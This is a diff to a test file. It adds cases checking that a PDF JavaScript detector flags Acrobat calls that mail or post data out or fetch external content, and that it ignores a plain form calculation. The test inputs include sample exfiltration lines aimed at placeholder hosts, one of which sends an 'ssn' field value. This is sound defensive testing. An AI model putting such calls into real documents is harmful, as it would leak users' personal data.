@@ -377,6 +377,23 @@ describe('File Rules', () => {
       expect(result!.matched).toBe(true);
     });
 
+    it.each([
+      'this.mailDoc({ cTo: "collector@example.invalid" })',
+      'this.mailForm(false, "collector@example.invalid")',
+      'app.mailMsg({ cTo: "collector@example.invalid", cMsg: this.getField("ssn").value })',
+      'this.getURL("https://example.invalid/collect")',
+      'app.openDoc({ cPath: "https://example.invalid/next.pdf" })',
+      'this.importDataObject("data")',
+      'SOAP.connect("https://example.invalid/service")',
+      'Net.HTTP.request({ cVerb: "POST", cURL: "https://example.invalid" })',
+    ])('detects Acrobat data-sending and external-content calls: %s', script => {
+      expect(pdfJavascriptDetection(script)).toMatchObject({ matched: true });
+    });
+
+    it('ignores an ordinary form calculation script', () => {
+      expect(pdfJavascriptDetection('function total() { return this.getField("a").value + this.getField("b").value; }')).toBeNull();
+    });
+
     it('returns higher confidence for multiple patterns', () => {
       const result = pdfJavascriptDetection('app.launchURL("url"); this.submitForm("url"); eval("code")');
       expect(result).not.toBeNull();
